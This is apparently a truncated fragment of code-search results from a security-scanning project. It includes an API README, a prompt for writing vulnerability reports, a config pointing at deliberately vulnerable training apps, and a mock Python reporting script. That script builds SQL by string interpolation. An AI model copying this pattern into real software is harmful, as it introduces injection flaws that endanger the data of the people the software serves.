Prerequisites\\",\\"lineNumber\\":14},{\\"lineNumber\\":15},{\\"text\\":\\"- Java 17 or higher\\",\\"lineNumber\\":16},{\\"text\\":\\"- Maven 3.6 or higher\\",\\"lineNumber\\":17},{\\"lineNumber\\":18},{\\"text\\":\\"## Quick Start\\",\\"lineNumber\\":19},{\\"lineNumber\\":20},{\\"text\\":\\"### 1. Build the Application\\",\\"lineNumber\\":21},{\\"lineNumber\\":22},{\\"text\\":\\"\`\`\`bash\\",\\"lineNumber\\":23},{\\"text\\":\\"mvn clean install\\",\\"lineNumber\\":24},{\\"text\\":\\"\`\`\`\\",\\"lineNumber\\":25},{\\"lineNumber\\":26},{\\"text\\":\\"### 2. Run the Application\\",\\"lineNumber\\":27},{\\"lineNumber\\":28},{\\"text\\":\\"\`\`\`bash\\",\\"lineNumber\\":29},{\\"text\\":\\"mvn spring-boot:run\\",\\"lineNumber\\":30},{\\"text\\":\\"\`\`\`\\",\\"lineNumber\\":31},{\\"lineNumber\\":32},{\\"text\\":\\"The application will start on \`http://localhost:8080\`\\",\\"lineNumber\\":33},{\\"lineNumber\\":34},{\\"text\\":\\"### 3. Access the Web Interface\\",\\"lineNumber\\":35},{\\"lineNumber\\":36},{\\"text\\":\\"Open your browser and navigate to \`http://localhost:8080\` to access the web interface for testing the API.\\",\\"lineNumber\\":37},{\\"lineNumber\\":38},{\\"text\\":\\"## API Endpoints\\",\\"lineNumber\\":39},{\\"lineNumber\\":40},{\\"text\\":\\"### Upload File\\",\\"lineNumber\\":41},{\\"text\\":\\"- **URL**: \`POST /api/files/upload\`\\",\\"lineNumber\\":42},{\\"text\\":\\"- **Content-Type**: \`multipart/form-data\`\\",\\"lineNumber\\":43},{\\"text\\":\\"- **Parameter**: \`file\` (the file to upload)\\",\\"lineNumber\\":44},{\\"text\\":\\"- **Response**: JSON with success message and generated filename\\",\\"lineNumber\\":45},{\\"lineNumber\\":46},{\\"text\\":\\"**Example using curl:**\\",\\"lineNumber\\":47},{\\"text\\":\\"\`\`\`bash\\",\\"lineNumber\\":48},{\\"text\\":\\"curl -X POST -F \\\\\\"file=@/path/to/your/file.txt\\\\\\" http://localhost:8080/api/files/upload\\",\\"lineNumber\\":49},{\\"text\\":\\"\`\`\`\\",\\"lineNumber\\":50},{\\"lineNumber\\":51},{\\"text\\":\\"### Download File\\",\\"lineNumber\\":52},{\\"text\\":\\"- **URL**: \`GET /api/files/download?filename={filename}\`\\",\\"lineNumber\\":53},{\\"text\\":\\"- **Response**: File download with appropriate headers\\",\\"lineNumber\\":54},{\\"lineNumber\\":55},{\\"text\\":\\"**Example using curl:**\\",\\"lineNumber\\":56},{\\"text\\":\\"\`\`\`bash\\",\\"lineNumber\\":57},{\\"text\\":\\"curl -O -J \\\\\\"http://localhost:8080/api/files/download?filename={filename}\\\\\\"\\",\\"lineNumber\\":58},{\\"text\\":\\"\`\`\`\\",\\"lineNumber\\":59},{\\"lineNumber\\":60},{\\"text\\":\\"### List Files\\",\\"lineNumber\\":61},{\\"text\\":\\"- **URL**: \`GET /api/files/list\`\\",\\"lineNumber\\":62},{\\"text\\":\\"- **Response**: JSON with list of all uploaded files\\",\\"lineNumber\\":63},{\\"lineNumber\\":64},{\\"text\\":\\"**Example using curl:**\\",\\"lineNumber\\":65},{\\"text\\":\\"\`\`\`bash\\",\\"lineNumber\\":66},{\\"text\\":\\"curl http://localhost:8080/api/files/list\\",\\"lineNumber\\":67},{\\"text\\":\\"\`\`\`\\",\\"lineNumber\\":68},{\\"lineNumber\\":69},{\\"text\\":\\"### Delete File\\",\\"lineNumber\\":70},{\\"text\\":\\"- **URL**: \`DELETE /api/files/delete?filename={filename}\`\\",\\"lineNumber\\":71},{\\"text\\":\\"- **Response**: JSON with success message\\",\\"lineNumber\\":72},{\\"lineNumber\\":73},{\\"text\\":\\"**Example using curl:**\\",\\"lineNumber\\":74},{\\"text\\":\\"\`\`\`bash\\",\\"lineNumber\\":75},{\\"text\\":\\"curl -X DELETE \\\\\\"http://localhost:8080/api/files/delete?filename={filename}\\\\\\"\\",\\"lineNumber\\":76},{\\"text\\":\\"\`\`\`\\",\\"lineNumber\\":77},{\\"lineNumber\\":78},{\\"text\\":\\"### Get File Information\\",\\"lineNumber\\":79},{\\"text\\":\\"- **URL**: \`GET /api/files/info?filename={filename}\`\\",\\"lineNumber\\":80},{\\"text\\":\\"- **Response**: JSON with file metadata (size, last modified)\\",\\"lineNumber\\":81}]},\\"score\\":0.31596270203590393},{\\"codeBlock\\":{\\"relativeWorkspacePath\\":\\"patchino/patchino/generator/prompt_files/markdown_system_prompt.txt\\",\\"range\\":{\\"startPosition\\":{},\\"endPosition\\":{\\"line\\":44}},\\"contents\\":\\"You are an expert in software security and technical documentation. You are tasked with generating a structured vulnerability.md file for a given software vulnerability. The file must follow the exact markdown format provided below and include all relevant technical details. Ensure your explanations are accurate, examples are syntactically correct, and sections are complete.\\\\n\\\\nUse the following format:\\\\n\`\`\`\\\\n# {vuln_name}\\\\n\\\\n## 1. Vulnerability Description\\\\n\\\\n[Describe the vulnerability here]\\\\n\\\\n## 2. How It Works\\\\n\\\\n[Explain how the vulnerability works]\\\\n\\\\n## 3. Vulnerable Code Examples\\\\n\\\\n### Example 1\\\\n\`\`\`{language}\\\\n// Add vulnerable code example here\\\\n\`\`\`\\\\n\\\\n## 4. Remediation Strategies\\\\n\\\\n### Safe Code Examples\\\\n\`\`\`{language}\\\\n// Add safe code example here\\\\n\`\`\`\\\\n\\\\n## 5. False Positives Detection\\\\n\\\\n### More Safe Code Examples\\\\n\`\`\`{language}\\\\n// Add more safe code example here or refer to previous examples\\\\n\`\`\`\\\\n\\\\n## 5. Other Information\\\\n\\\\n\\\\n\\\\n### Read More\\\\n\\\\n* https://example_documentation.com\\\\n\\\\n\`\`\`\\\\n\\",\\"originalContents\\":\\"You are an expert in software security and technical documentation. You are tasked with generating a structured vulnerability.md file for a given software vulnerability. The file must follow the exact markdown format provided below and include all relevant technical details. Ensure your explanations are accurate, examples are syntactically correct, and sections are complete.\\\\n\\\\nUse the following format:\\\\n\`\`\`\\\\n# {vuln_name}\\\\n\\\\n## 1. Vulnerability Description\\\\n\\\\n[Describe the vulnerability here]\\\\n\\\\n## 2. How It Works\\\\n\\\\n[Explain how the vulnerability works]\\\\n\\\\n## 3. Vulnerable Code Examples\\\\n\\\\n### Example 1\\\\n\`\`\`{language}\\\\n// Add vulnerable code example here\\\\n\`\`\`\\\\n\\\\n## 4. Remediation Strategies\\\\n\\\\n### Safe Code Examples\\\\n\`\`\`{language}\\\\n// Add safe code example here\\\\n\`\`\`\\\\n\\\\n## 5. False Positives Detection\\\\n\\\\n### More Safe Code Examples\\\\n\`\`\`{language}\\\\n// Add more safe code example here or refer to previous examples\\\\n\`\`\`\\\\n\\\\n## 5. Other Information\\\\n\\\\n\\\\n\\\\n### Read More\\\\n\\\\n* https://example_documentation.com\\\\n\\\\n\`\`\`\\\\n\\",\\"detailedLines\\":[{\\"text\\":\\"You are an expert in software security and technical documentation. You are tasked with generating a structured vulnerability.md file for a given software vulnerability. The file must follow the exact markdown format provided below and include all relevant technical details. Ensure your explanations are accurate, examples are syntactically correct, and sections are complete.\\",\\"lineNumber\\":1},{\\"lineNumber\\":2},{\\"text\\":\\"Use the following format:\\",\\"lineNumber\\":3},{\\"text\\":\\"\`\`\`\\",\\"lineNumber\\":4},{\\"text\\":\\"# {vuln_name}\\",\\"lineNumber\\":5},{\\"lineNumber\\":6},{\\"text\\":\\"## 1. Vulnerability Description\\",\\"lineNumber\\":7},{\\"lineNumber\\":8},{\\"text\\":\\"[Describe the vulnerability here]\\",\\"lineNumber\\":9},{\\"lineNumber\\":10},{\\"text\\":\\"## 2. How It Works\\",\\"lineNumber\\":11},{\\"lineNumber\\":12},{\\"text\\":\\"[Explain how the vulnerability works]\\",\\"lineNumber\\":13},{\\"lineNumber\\":14},{\\"text\\":\\"## 3. Vulnerable Code Examples\\",\\"lineNumber\\":15},{\\"lineNumber\\":16},{\\"text\\":\\"### Example 1\\",\\"lineNumber\\":17},{\\"text\\":\\"\`\`\`{language}\\",\\"lineNumber\\":18},{\\"text\\":\\"// Add vulnerable code example here\\",\\"lineNumber\\":19},{\\"text\\":\\"\`\`\`\\",\\"lineNumber\\":20},{\\"lineNumber\\":21},{\\"text\\":\\"## 4. Remediation Strategies\\",\\"lineNumber\\":22},{\\"lineNumber\\":23},{\\"text\\":\\"### Safe Code Examples\\",\\"lineNumber\\":24},{\\"text\\":\\"\`\`\`{language}\\",\\"lineNumber\\":25},{\\"text\\":\\"// Add safe code example here\\",\\"lineNumber\\":26},{\\"text\\":\\"\`\`\`\\",\\"lineNumber\\":27},{\\"lineNumber\\":28},{\\"text\\":\\"## 5. False Positives Detection\\",\\"lineNumber\\":29},{\\"lineNumber\\":30},{\\"text\\":\\"### More Safe Code Examples\\",\\"lineNumber\\":31},{\\"text\\":\\"\`\`\`{language}\\",\\"lineNumber\\":32},{\\"text\\":\\"// Add more safe code example here or refer to previous examples\\",\\"lineNumber\\":33},{\\"text\\":\\"\`\`\`\\",\\"lineNumber\\":34},{\\"lineNumber\\":35},{\\"text\\":\\"## 5. Other Information\\",\\"lineNumber\\":36},{\\"lineNumber\\":37},{\\"lineNumber\\":38},{\\"lineNumber\\":39},{\\"text\\":\\"### Read More\\",\\"lineNumber\\":40},{\\"lineNumber\\":41},{\\"text\\":\\"* https://example_documentation.com\\",\\"lineNumber\\":42},{\\"lineNumber\\":43},{\\"text\\":\\"\`\`\`\\",\\"lineNumber\\":44}]},\\"score\\":0.3146929144859314},{\\"codeBlock\\":{\\"relativeWorkspacePath\\":\\"services/node_general_backend/src/maintenance/try_now.ts\\",\\"range\\":{\\"startPosition\\":{},\\"endPosition\\":{\\"line\\":55,\\"column\\":1}},\\"contents\\":\\"import path from 'node:path'\\\\n\\\\nimport {\\\\n  Projects,\\\\n  Vendors,\\\\n} from '../servers/vulnerability_report/vuln_report_generates'\\\\n\\\\nconst DATA_DIR = path.join(__dirname, 'try_now')\\\\n\\\\nexport const TRY_NOW_PROJECTS = {\\\\n  [Projects.JuiceShop]: {\\\\n    url: 'https://github.com/juice-shop/juice-shop',\\\\n    reference: '9a0789b5ecb4ee76fe528b1860095e945f6302ac',\\\\n    repoFile: path.join(DATA_DIR, 'juice-shop/repo.zip'),\\\\n    reportFiles: {\\\\n      [Vendors.Checkmarx]: path.join(DATA_DIR, 'juice-shop/checkmarx.json'),\\\\n      [Vendors.CodeQl]: path.join(DATA_DIR, 'juice-shop/codeql.json'),\\\\n      [Vendors.Snyk]: path.join(DATA_DIR, 'juice-shop/snyk.json'),\\\\n      [Vendors.Fortify]: path.join(DATA_DIR, 'juice-shop/fortify.fpr'),\\\\n      [Vendors.SonarQube]: path.join(DATA_DIR, 'juice-shop/sonarqube.json'),\\\\n      [Vendors.Semgrep]: path.join(DATA_DIR, 'juice-shop/semgrep.json'),\\\\n      [Vendors.Opengrep]: path.join(DATA_DIR, 'juice-shop/semgrep.json'),\\\\n      [Vendors.Datadog]: path.join(DATA_DIR, 'juice-shop/datadog.json'),\\\\n    },\\\\n  },\\\\n  [Projects.Webgoat]: {\\\\n    url: 'https://github.com/WebGoat/WebGoat',\\\\n    reference: 'c7a41d1b178d006053293699061e0dfdb4f47b99',\\\\n    repoFile: path.join(DATA_DIR, 'webgoat/repo.zip'),\\\\n    reportFiles: {\\\\n      [Vendors.Checkmarx]: path.join(DATA_DIR, 'webgoat/checkmarx.json'),\\\\n      [Vendors.CodeQl]: path.join(DATA_DIR, 'webgoat/codeql.json'),\\\\n      [Vendors.Snyk]: path.join(DATA_DIR, 'webgoat/snyk.json'),\\\\n      [Vendors.Fortify]: path.join(DATA_DIR, 'webgoat/fortify.fpr'),\\\\n      [Vendors.SonarQube]: path.join(DATA_DIR, 'webgoat/sonarqube.json'),\\\\n      [Vendors.Semgrep]: path.join(DATA_DIR, 'webgoat/semgrep.json'),\\\\n      [Vendors.Opengrep]: path.join(DATA_DIR, 'webgoat/semgrep.json'),\\\\n      [Vendors.Datadog]: path.join(DATA_DIR, 'webgoat/datadog.json'),\\\\n    },\\\\n  },\\",\\"originalContents\\":\\"import path from 'node:path'\\\\n\\\\nimport {\\\\n  Projects,\\\\n  Vendors,\\\\n} from '../servers/vulnerability_report/vuln_report_generates'\\\\n\\\\nconst DATA_DIR = path.join(__dirname, 'try_now')\\\\n\\\\nexport const TRY_NOW_PROJECTS = {\\\\n  [Projects.JuiceShop]: {\\\\n    url: 'https://github.com/juice-shop/juice-shop',\\\\n    reference: '9a0789b5ecb4ee76fe528b1860095e945f6302ac',\\\\n    repoFile: path.join(DATA_DIR, 'juice-shop/repo.zip'),\\\\n    reportFiles: {\\\\n      [Vendors.Checkmarx]: path.join(DATA_DIR, 'juice-shop/checkmarx.json'),\\\\n      [Vendors.CodeQl]: path.join(DATA_DIR, 'juice-shop/codeql.json'),\\\\n      [Vendors.Snyk]: path.join(DATA_DIR, 'juice-shop/snyk.json'),\\\\n      [Vendors.Fortify]: path.join(DATA_DIR, 'juice-shop/fortify.fpr'),\\\\n      [Vendors.SonarQube]: path.join(DATA_DIR, 'juice-shop/sonarqube.json'),\\\\n      [Vendors.Semgrep]: path.join(DATA_DIR, 'juice-shop/semgrep.json'),\\\\n      [Vendors.Opengrep]: path.join(DATA_DIR, 'juice-shop/semgrep.json'),\\\\n      [Vendors.Datadog]: path.join(DATA_DIR, 'juice-shop/datadog.json'),\\\\n    },\\\\n  },\\\\n  [Projects.Webgoat]: {\\\\n    url: 'https://github.com/WebGoat/WebGoat',\\\\n    reference: 'c7a41d1b178d006053293699061e0dfdb4f47b99',\\\\n    repoFile: path.join(DATA_DIR, 'webgoat/repo.zip'),\\\\n    reportFiles: {\\\\n      [Vendors.Checkmarx]: path.join(DATA_DIR, 'webgoat/checkmarx.json'),\\\\n      [Vendors.CodeQl]: path.join(DATA_DIR, 'webgoat/codeql.json'),\\\\n      [Vendors.Snyk]: path.join(DATA_DIR, 'webgoat/snyk.json'),\\\\n      [Vendors.Fortify]: path.join(DATA_DIR, 'webgoat/fortify.fpr'),\\\\n      [Vendors.SonarQube]: path.join(DATA_DIR, 'webgoat/sonarqube.json'),\\\\n      [Vendors.Semgrep]: path.join(DATA_DIR, 'webgoat/semgrep.json'),\\\\n      [Vendors.Opengrep]: path.join(DATA_DIR, 'webgoat/semgrep.json'),\\\\n      [Vendors.Datadog]: path.join(DATA_DIR, 'webgoat/datadog.json'),\\\\n    },\\\\n  },\\",\\"detailedLines\\":[{\\"text\\":\\"import path from 'node:path'\\",\\"lineNumber\\":1},{\\"lineNumber\\":2},{\\"text\\":\\"import {\\",\\"lineNumber\\":3},{\\"text\\":\\"  Projects,\\",\\"lineNumber\\":4},{\\"text\\":\\"  Vendors,\\",\\"lineNumber\\":5},{\\"text\\":\\"} from '../servers/vulnerability_report/vuln_report_generates'\\",\\"lineNumber\\":6},{\\"lineNumber\\":7},{\\"text\\":\\"const DATA_DIR = path.join(__dirname, 'try_now')\\",\\"lineNumber\\":8},{\\"lineNumber\\":9},{\\"text\\":\\"export const TRY_NOW_PROJECTS = {\\",\\"lineNumber\\":10},{\\"text\\":\\"  [Projects.JuiceShop]: {\\",\\"lineNumber\\":11},{\\"text\\":\\"    url: 'https://github.com/juice-shop/juice-shop',\\",\\"lineNumber\\":12},{\\"text\\":\\"    reference: '9a0789b5ecb4ee76fe528b1860095e945f6302ac',\\",\\"lineNumber\\":13},{\\"text\\":\\"    repoFile: path.join(DATA_DIR, 'juice-shop/repo.zip'),\\",\\"lineNumber\\":14},{\\"text\\":\\"    reportFiles: {\\",\\"lineNumber\\":15},{\\"text\\":\\"      [Vendors.Checkmarx]: path.join(DATA_DIR, 'juice-shop/checkmarx.json'),\\",\\"lineNumber\\":16},{\\"text\\":\\"      [Vendors.CodeQl]: path.join(DATA_DIR, 'juice-shop/codeql.json'),\\",\\"lineNumber\\":17},{\\"text\\":\\"      [Vendors.Snyk]: path.join(DATA_DIR, 'juice-shop/snyk.json'),\\",\\"lineNumber\\":18},{\\"text\\":\\"      [Vendors.Fortify]: path.join(DATA_DIR, 'juice-shop/fortify.fpr'),\\",\\"lineNumber\\":19},{\\"text\\":\\"      [Vendors.SonarQube]: path.join(DATA_DIR, 'juice-shop/sonarqube.json'),\\",\\"lineNumber\\":20},{\\"text\\":\\"      [Vendors.Semgrep]: path.join(DATA_DIR, 'juice-shop/semgrep.json'),\\",\\"lineNumber\\":21},{\\"text\\":\\"      [Vendors.Opengrep]: path.join(DATA_DIR, 'juice-shop/semgrep.json'),\\",\\"lineNumber\\":22},{\\"text\\":\\"      [Vendors.Datadog]: path.join(DATA_DIR, 'juice-shop/datadog.json'),\\",\\"lineNumber\\":23},{\\"text\\":\\"    },\\",\\"lineNumber\\":24},{\\"text\\":\\"  },\\",\\"lineNumber\\":25},{\\"text\\":\\"  [Projects.Webgoat]: {\\",\\"lineNumber\\":26},{\\"text\\":\\"    url: 'https://github.com/WebGoat/WebGoat',\\",\\"lineNumber\\":27},{\\"text\\":\\"    reference: 'c7a41d1b178d006053293699061e0dfdb4f47b99',\\",\\"lineNumber\\":28},{\\"text\\":\\"    repoFile: path.join(DATA_DIR, 'webgoat/repo.zip'),\\",\\"lineNumber\\":29},{\\"text\\":\\"    reportFiles: {\\",\\"lineNumber\\":30},{\\"text\\":\\"      [Vendors.Checkmarx]: path.join(DATA_DIR, 'webgoat/checkmarx.json'),\\",\\"lineNumber\\":31},{\\"text\\":\\"      [Vendors.CodeQl]: path.join(DATA_DIR, 'webgoat/codeql.json'),\\",\\"lineNumber\\":32},{\\"text\\":\\"      [Vendors.Snyk]: path.join(DATA_DIR, 'webgoat/snyk.json'),\\",\\"lineNumber\\":33},{\\"text\\":\\"      [Vendors.Fortify]: path.join(DATA_DIR, 'webgoat/fortify.fpr'),\\",\\"lineNumber\\":34},{\\"text\\":\\"      [Vendors.SonarQube]: path.join(DATA_DIR, 'webgoat/sonarqube.json'),\\",\\"lineNumber\\":35},{\\"text\\":\\"      [Vendors.Semgrep]: path.join(DATA_DIR, 'webgoat/semgrep.json'),\\",\\"lineNumber\\":36},{\\"text\\":\\"      [Vendors.Opengrep]: path.join(DATA_DIR, 'webgoat/semgrep.json'),\\",\\"lineNumber\\":37},{\\"text\\":\\"      [Vendors.Datadog]: path.join(DATA_DIR, 'webgoat/datadog.json'),\\",\\"lineNumber\\":38},{\\"text\\":\\"    },\\",\\"lineNumber\\":39},{\\"text\\":\\"  },\\",\\"lineNumber\\":40},{\\"text\\":\\"  [Projects.Altoroj]: {\\",\\"lineNumber\\":41},{\\"text\\":\\"    url: 'https://github.com/HCL-TECH-SOFTWARE/AltoroJ'\\",\\"lineNumber\\":42},{\\"text\\":\\",\\",\\"lineNumber\\":55},{\\"text\\":\\"}\\",\\"lineNumber\\":56}]},\\"score\\":0.3024810552597046},{\\"codeBlock\\":{\\"relativeWorkspacePath\\":\\"patchino/ai-playground/src/components/mock.ts\\",\\"range\\":{\\"startPosition\\":{},\\"endPosition\\":{\\"line\\":362,\\"column\\":1}},\\"contents\\":\\"export const mockFile = \`downloadFileimport argparse\\\\nimport collections\\\\nimport datetime\\\\nimport grpc\\\\nimport itertools\\\\nimport numpy as np\\\\nimport os\\\\nimport pandas as pd\\\\nimport pandas.io.sql as sqlio\\\\nimport subprocess\\\\nimport time\\\\nimport streamlit as st\\\\nfrom collections import defaultdict\\\\nimport plotly.express as px\\\\n\\\\nfrom google.protobuf import timestamp_pb2\\\\n\\\\nfrom cresta.v1.analytics import analytics_service_pb2\\\\nfrom cresta.v1.analytics import analytics_service_pb2_grpc\\\\nfrom cresta.v1.analytics import common_pb2\\\\nfrom cresta.v1.analytics import qa_stats_pb2\\\\nfrom cresta.v1.user import user_pb2\\\\n\\\\nfrom greyparrot.common import Customer\\\\nfrom greyparrot.conversations.db import ConversationsDBConn\\\\n\\\\nst.write(\\\\\\"\\\\\\"\\\\\\"# Coaching Report #\\\\\\"\\\\\\"\\\\\\")\\\\n\\\\nport_forward_ports_and_processes = {\\\\n    'chat-prod': (8081, None),\\\\n    'voice-prod': (8082, None),\\\\n    'us-west-2-prod': (8083, None),\\\\n}\\\\n\\\\nall_customers = [{\\\\n    'display_name': f'{display_name} ({customer_name})',\\\\n    'name': customer_name,\\\\n    'customer_id': customer_id,\\\\n    'profile_id': profile_id,\\\\n    'prod_env_name': prod_env_name,\\\\n    'domain': domain,\\\\n} for display_name, customer_name, customer_id, profile_id, prod_env_name, domain in sorted(\\\\n    list(\\\\n        set((c.pretty_name or c.name.value, c.name.value, c.customer_id, c.profile_id,\\\\n             c.prod_env_name, c.domain) for c in Customer.all()\\\\n            if c.prod_env_name in port_forward_ports_and_processes.keys())))]\\\\n\\\\ndef build_coaching_plan_url(customer, agent_user_id, coaching_plan_id):\\\\n    return f\\\\\\"{customer['domain']}/director/coaching/workflow/agent/{agent_user_id}/plan/{coaching_plan_id}\\\\\\"\\\\n\\\\n@st.cache_data\\\\ndef load_coaching_data(customer_display_name, num_last_days, num_days):\\\\n    if not customer_display_name:\\\\n        return None\\\\n\\\\n    current_datetime = datetime.datetime.now(datetime.timezone.utc)\\\\n    first_session_days = current_datetime - datetime.timedelta(days=num_last_days)\\\\n    last_session_days = current_datetime - datetime.timedelta(days=num_days)\\\\n\\\\n    customer = next(c for c in all_customers if c['display_name'] == customer_display_name)\\\\n\\\\n    db_conn = ConversationsDBConn.from_customer_name(customer['name'])\\\\n    conn = db_conn.session.connection().connection\\\\n\\\\n    user_id_name = {}\\\\n    scorecard_template_id_name_map = {}\\\\n    template_criteria_id_name_map = {}\\\\n    coaching_sessions = []\\\\n\\\\n    with conn.cursor() as cursor:\\\\n        cursor.execute(f\\\\\\"\\\\\\"\\\\\\"\\\\n            SELECT\\\\n                coaching_plans.resource_id as coaching_plan_id,\\\\n                cu.full_name as creator_user_name,\\\\n                cu.user_id as creator_user_id,\\\\n                COALESCE(su.full_name, '') as submitter_user_name,\\\\n                COALESCE(su.user_id, '') as submitter_user_id,\\\\n                coaching_sessions.session_at as session_time,\\\\n                coaching_plans.focus_criteria_ids as focus_behaviors,\\\\n                au.full_name as agent_user_name,\\\\n                au.user_id as agent_user_id,\\\\n                coaching_sessions.resource_id as session_id,\\\\n                coaching_sessions.usecase_id as usecase\\\\n            FROM director.coaching_plans \\\\n                JOIN director.coaching_sessions ON coaching_plans.resource_id = coaching_sessions.coaching_plan_id\\\\n                JOIN app.users as cu ON coaching_sessions.creator_user_id = cu.user_id\\\\n                LEFT JOIN app.users as su ON coaching_sessions.manager_submitter_user_id = su.user_id\\\\n                JOIN app.users as au ON coaching_plans.agent_user_id = au.user_id\\\\n            WHERE coaching_sessions.manager_submitted_at > '{first_session_days.strftime(\\\\\\"%Y-%m-%d\\\\\\")}'\\\\n                AND coaching_sessions.session_at <= '{last_session_days.strftime(\\\\\\"%Y-%m-%d\\\\\\")}'\\\\n            \\\\\\"\\\\\\"\\\\\\")\\\\n        \\\\n        rows = cursor.fetchall()\\\\n        for session_note in rows:\\\\n            if session_note[6] is not None and len(session_note[6]) > 0:\\\\n                focus_criteria = session_note[6]\\\\n                for criteria in focus_criteria:\\\\n                    ids = criteria.split('/')\\\\n                    scorecard_template_id_name_map[ids[0]] = ''\\\\n                    coaching_sessions.append({\\\\n                        \\\\\\"session_id\\\\\\": session_note[9],\\\\n                        \\\\\\"usecase\\\\\\": session_note[10],\\\\n                        \\\\\\"coaching_plan_id\\\\\\": session_note[0],\\\\n                        \\\\\\"coaching_plan_url\\\\\\": build_coaching_plan_url(customer, session_note[8], session_note[0]),\\\\n                        \\\\\\"creator_user_name\\\\\\": session_note[1],\\\\n                        \\\\\\"creator_user_id\\\\\\": session_note[2],\\\\n                        \\\\\\"submitter_user_name\\\\\\": session_note[3],\\\\n                        \\\\\\"submitter_user_id\\\\\\": session_note[4],\\\\n                        \\\\\\"session_time\\\\\\": session_note[5],\\\\n                        \\\\\\"focus_criteria_template_id\\\\\\": ids[0],\\\\n                        \\\\\\"focus_criteria_id\\\\\\": ids[1],\\\\n                        \\\\\\"agent_user_name\\\\\\": session_note[7],\\\\n                        \\\\\\"agent_user_id\\\\\\": session_note[8],\\\\n                        \\\\\\"before_score\\\\\\": -1,\\\\n                        \\\\\\"before_convo_count\\\\\\": 0,\\\\n                        \\\\\\"after_score\\\\\\": -1,\\\\n                        \\\\\\"after_convo_count\\\\\\": 0,\\\\n                    })\\\\n            else:\\\\n                coaching_sessions.append({\\\\n                    \\\\\\"session_id\\\\\\": session_note[9],\\\\n                    \\\\\\"coaching_plan_id\\\\\\": session_note[0],\\\\n                    \\\\\\"coaching_plan_url\\\\\\": build_coaching_plan_url(customer, session_note[8], session_note[0]),\\\\n                    \\\\\\"creator_user_name\\\\\\": session_note[1],\\\\n                    \\\\\\"creator_user_id\\\\\\": session_note[2],\\\\n                    \\\\\\"submitter_user_name\\\\\\": session_note[3],\\\\n                    \\\\\\"submitter_user_id\\\\\\": session_note[4],\\\\n                    \\\\\\"session_time\\\\\\": session_note[5],\\\\n                    \\\\\\"focus_criteria_template_id\\\\\\": '',\\\\n                    \\\\\\"focus_criteria_id\\\\\\": '',\\\\n                    \\\\\\"agent_user_name\\\\\\": session_note[7],\\\\n                    \\\\\\"agent_user_id\\\\\\": session_note[8],\\\\n                    \\\\\\"before_score\\\\\\": -1,\\\\n                    \\\\\\"before_convo_count\\\\\\": 0,\\\\n                    \\\\\\"after_score\\\\\\": -1,\\\\n                    \\\\\\"after_convo_count\\\\\\": 0,\\\\n                })\\\\n            user_id_name[session_note[2]] = session_note[1]\\\\n            user_id_name[session_note[4]] = session_note[3]\\\\n            user_id_name[session_note[8]] = session_note[7]\\\\n\\\\n    if len(scorecard_template_id_name_map) == 0:\\\\n        return coaching_sessions\\\\n\\\\n    with conn.cursor() as cursor:\\\\n        cursor.execute(f\\\\\\"\\\\\\"\\\\\\"\\\\n            SELECT\\\\n                resource_id as scorecard_template_id,\\\\n                title as title,\\\\n                template as template\\\\n            FROM director.scorecard_templates \\\\n            WHERE resource_id IN ('{\\\\\\"','\\\\\\".join(scorecard_template_id_name_map.keys())}')\\\\n            \\\\\\"\\\\\\"\\\\\\")\\\\n        \\\\n        rows = cursor.fetchall()\\\\n        for template in rows:\\\\n            scorecard_template_id_name_map[template[0]] = template[1]\\\\n            for items in template[2].get('items', []):\\\\n                if 'identifier' in items and 'displayName' in items:\\\\n                    template_criteria_id_name_map[items['identifier']] = items['displayName']\\\\n                if 'items' in items:\\\\n                    for criteria_items in items['items']:\\\\n                        if 'identifier' in criteria_items and 'displayName' in criteria_items:\\\\n                            template_criteria_id_name_map[criteria_items['identifier']] = criteria_items['displayName']\\\\n\\\\n        for session in coaching_sessions:\\\\n            if session['focus_criteria_template_id'] != '':\\\\n                session['focus_criteria_template'] = scorecard_template_id_name_map[session['focus_criteria_template_id']]\\\\n            if session['focus_criteria_id'] != '' and session['focus_criteria_id'] in template_criteria_id_name_map:\\\\n                session['focus_criteria'] = template_criteria_id_name_map[session['focus_criteria_id']]\\\\n        \\\\n    return coaching_sessions\\\\n\\\\n\\\\ndef load_scores_data(customer_display_name, coaching_sessions, num_days):\\\\n    if not coaching_sessions:\\\\n        return None\\\\n\\\\n    customer = next(c for c in all_customers if c['display_name'] == customer_display_name)\\\\n\\\\n    progress = st.progress(0, text=\\\\\\"Computing the coaching efficiency of the session notes...\\\\\\")\\\\n\\\\n    port_number, port_forward_process = port_forward_ports_and_processes[customer['prod_env_name']]\\\\n    if port_forward_process is None or port_forward_process.poll() is not None:\\\\n        process = subprocess.Popen([\\\\n            'kubectl',\\\\n            f'--context={customer[\\\\\\"prod_env_name\\\\\\"]}',\\\\n            '--namespace=cresta-api',\\\\n            'port-forward',\\\\n            'services/insights-server',\\\\n            f'{port_number}:80',\\\\n        ])\\\\n        port_forward_ports_and_processes[customer['prod_env_name']] = (port_number, process)\\\\n        time.sleep(2)\\\\n\\\\n    api_key = os.environ.get('INSIGHTS_SERVER_API_KEY')\\\\n    assert api_key, 'INSIGHTS_SERVER_API_KEY must be set'\\\\n    auth_metadata = [['authorization', f'ApiKey {api_key}']]\\\\n\\\\n    with grpc.insecure_channel(\\\\n            f'localhost:{port_number}',\\\\n            options=[\\\\n                ('grpc.max_receive_message_length', 50000000),\\\\n            ],\\\\n    ) as channel:\\\\n        stub = analytics_service_pb2_grpc.AnalyticsServiceStub(channel)\\\\n        for coaching_session_idx in range(len(coaching_sessions)):\\\\n            progress.progress(coaching_session_idx / len(coaching_sessions), text=\\\\\\"Computing the coaching efficiency of the session notes...\\\\\\")\\\\n            coaching_session = coaching_sessions[coaching_session_idx]\\\\n            if coaching_session['focus_criteria_id'] != '':\\\\n                before_score, before_convo_count = query_agent_criteria_score(\\\\n                    stub, customer, auth_metadata, coaching_session['agent_user_id'], coaching_session['focus_criteria_id'], coaching_session['session_time'] - datetime.timedelta(days=num_days), coaching_session['session_time'])\\\\n                after_score, after_convo_count = query_agent_criteria_score(\\\\n                    stub, customer, auth_metadata, coaching_session['agent_user_id'], coaching_session['focus_criteria_id'], coaching_session['session_time'], coaching_session['session_time'] + datetime.timedelta(days=num_days))\\\\n                coaching_session['before_score'] = before_score\\\\n                coaching_session['before_convo_count'] = before_convo_count\\\\n                coaching_session['after_score'] = after_score\\\\n                coaching_session['after_convo_count'] = after_convo_count\\\\n\\\\n    progress.empty()\\\\n    return coaching_sessions\\\\n\\\\n@st.cache_data\\\\ndef query_agent_criteria_score(_stub, customer, auth_metadata, agent_user_id, criteria_id, start_time, end_time):\\\\n    parent = f'customers/{customer[\\\\\\"customer_id\\\\\\"]}/profiles/{customer[\\\\\\"profile_id\\\\\\"]}'\\\\n 